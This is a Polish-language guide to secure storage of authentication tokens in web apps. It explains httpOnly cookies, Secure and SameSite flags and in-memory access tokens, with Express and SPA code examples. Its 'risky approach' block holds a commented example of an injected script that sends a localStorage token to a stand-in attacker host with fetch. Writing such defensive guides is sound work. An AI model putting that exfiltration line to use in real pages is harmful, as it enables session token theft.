# Secure Token Storage

> **Spis treści:** Metadane · TLDR · Uwagi (stan 2026, poprawki względem źródła) · Problem · Rozwiązanie · Przykłady kodu · Zalety · Wady / tradeoffs · Powiązane wzorce · Kiedy używać / kiedy NIE używać

Źródło: frontendpatterns.dev/secure-token-storage.

## Metadane

Kategoria: Security. Poziom: Advanced. Framework: Native web. Autor: Den Odell. Data aktualizacji:
21 czerwca 2026.

## TLDR

Nigdy nie przechowuj długotrwałych tokenów autentykacji w `localStorage`/`sessionStorage` — użyj
httpOnly cookies dla tokenów sesji/odświeżania i tokenu dostępu w pamięci (in-memory) dla SPA.

## Uwagi (stan 2026, poprawki względem źródła)

- Rekomendacja IETF „OAuth 2.0 for Browser-Based Apps” (2025): najbezpieczniejszy jest wzorzec **BFF**
  (Backend-for-Frontend) — tokeny OAuth w ogóle nie trafiają do przeglądarki, a SPA ma tylko ciasteczko sesji
  `HttpOnly; Secure; SameSite` do własnego backendu. Token w pamięci (przykład niżej) to kompromis dla SPA bez BFF.
- XSS w aplikacji z tokenem w pamięci nadal może wykonywać żądania w imieniu użytkownika — to ogranicza kradzież
  tokenu, nie skutki XSS.
- Wiele równoległych 401 → jedno odświeżenie: trzymaj współdzieloną obietnicę `refreshPromise`, inaczej wyścig
  refresh tokenów (przy rotacji) wyloguje użytkownika.
- Po stronie serwera (wydawanie, rotacja, JWT) — be-auth-security.

## Problem

Przechowywanie tokenów autentykacji w `localStorage` lub `sessionStorage` stanowi poważne
zagrożenie bezpieczeństwa. Cokolwiek przechowywane w `localStorage`/`sessionStorage` jest czytelne
dla **każdego** JavaScriptu działającego na stronie — obejmuje to złośliwe skrypty wstrzyknięte
przez XSS, skompromitowane tagi analityczne albo rozszerzenia przeglądarki. Pojedynczy wiersz kodu
wystarczy, by token trafił do serwera atakującego, a użytkownik pozostaje nieświadomy.

## Rozwiązanie

Trójwarstwowy model ochrony:

1. **httpOnly cookies** dla tokenów sesji i odświeżania — niewidoczne dla JavaScript, wysyłane
   automatycznie przez przeglądarkę.
2. **Flagi `Secure` i `SameSite`** — transmisja wyłącznie przez HTTPS + ochrona przed CSRF.
3. **In-memory access token** dla SPA — krótkotrwały token przechowywany w zmiennej zamknięcia
   (closure), nigdy na dysku.

## Przykłady kodu

### Podejście ryzykowne (do uniknięcia)

```javascript
// DON'T DO THIS. localStorage is readable by any JavaScript on the page,
// so a single XSS bug or compromised third-party script can steal the token.
localStorage.setItem('token', jwt);

// An injected attacker script needs just one line:
//   fetch('https://evil.example/steal?t=' + localStorage.getItem('token'));
```

### Ustawianie httpOnly cookie na serwerze (Express.js)

```javascript
// Express route handler
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  const token = signSessionToken(user);

  res.cookie('session', token, {
    httpOnly: true,        // invisible to JavaScript, so XSS cannot read it
    secure: true,          // only sent over HTTPS
    sameSite: 'strict',    // not sent on cross-site requests (CSRF defense)
    maxAge: 1000 * 60 * 60, // expires in 1 hour
    path: '/',
  });

  res.json({ ok: true });
});

// On later requests the browser sends the cookie automatically.
// The server reads it from req.cookies.session to authenticate.
```

### Access token w pamięci (SPA client)

```javascript
// auth.js — the access token lives only in this closure variable,
// never in localStorage or sessionStorage.
let accessToken = null;

export function setAccessToken(token) {
  accessToken = token;
}

// Ask the server for a new access token. The httpOnly refresh cookie
// is sent automatically because of `credentials: 'include'`.
export async function refreshAccessToken() {
  const res = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include',
  });
  if (!res.ok) throw new Error('Session expired');
  const { token } = await res.json();
  accessToken = token;
  return token;
}

// A fetch wrapper that attaches the in-memory token and refreshes once on 401.
export async function authedFetch(url, options = {}) {
  if (!accessToken) await refreshAccessToken();

  let res = await fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });

  if (res.status === 401) {
    await refreshAccessToken();
    res = await fetch(url, {
      ...options,
      headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
    });
  }

  return res;
}
```

## Zalety

- Ciasteczka httpOnly są niedostępne dla skryptów — ataki XSS nie mogą bezpośrednio odczytać tokena.
- Automatyczne wysyłanie przez przeglądarkę eliminuje ręczne zarządzanie tokenem po stronie klienta.
- Flaga `Secure` chroni transmisję, `SameSite` blokuje typowe wektory CSRF.
- Token dostępu w pamięci ogranicza okno ekspozycji XSS do kilku minut ważności tokenu.
- Refresh token nigdy nie jest osiągalny dla wstrzykniętych skryptów.
- Przeładowanie strony kasuje token z pamięci — skradziona (np. przez inspekcję) sesja nie
  pozostawia użytecznego tokenu trwałego.
- Integracja ze standardowymi frameworkami backendowymi jest prosta.

## Wady / tradeoffs

- Wymaga kontroli nad backendem i dedykowanego endpointu autentykacji (`/api/refresh`).
- Nadal konieczna ochrona CSRF (flagi, tokeny, double-submit) — cookies rozwiązują kradzież
  tokenu, nie fałszerstwo żądania.
- Token dostępu traci się przy przeładowaniu strony — wymaga zbudowania cichego mechanizmu
  odświeżania.
- Lokalne testowanie komplikuje wymóg HTTPS dla flagi `Secure`.
- Limit rozmiaru ciasteczka (~4 KB) może spowodować przepełnienie przy dużych tokenach.
- Interfejsy między domenami wymagają `SameSite=None; Secure` i poprawnej konfiguracji CORS.
- Aplikacje mobilne i klienci spoza przeglądarki nie dostają automatycznej obsługi cookies —
  wymagają innego schematu.
- Token dostępu w pamięci wciąż wymaga obrony przed XSS (output encoding, CSP, zaufane
  zależności) — to zmniejsza okno ryzyka, nie eliminuje go całkowicie.

## Powiązane wzorce

- CSRF Protection — Security (`csrf-protection.md`)
- SameSite Cookie — Security (`samesite-cookie.md`)
- Patrz też be-auth-security — sekcja o JWT/algorytmie i
  timing-safe comparison dotyczy backendu wydającego te tokeny, ten plik dotyczy przechowywania
  ich po stronie frontendu.
- Zewnętrzne: Web Storage Security (MDN), JWT Storage Best Practices (Auth0), Secure Cookie
  Attributes (OWASP).

## Kiedy używać / kiedy NIE używać

Stosuj httpOnly cookie + in-memory access token **zawsze**, gdy budujesz własną autentykację
sesyjną dla aplikacji webowej z przeglądarką jako klientem — to jest dziś rekomendowany standard,
nie jedna z opcji do rozważenia. **Nie** stosuj tego wzorca 1:1 dla aplikacji mobilnych/natywnych
klientów API bez przeglądarki — tam cookies nie są naturalnym mechanizmem transportu i potrzebny
jest inny model (np. secure storage systemu operacyjnego + refresh token rotation). Jeśli projekt
już używa zewnętrznego dostawcy identity (Auth0, Clerk, Firebase Auth) — sprawdź najpierw, jaki
model przechowywania on narzuca/rekomenduje, zamiast budować to samodzielnie od zera.
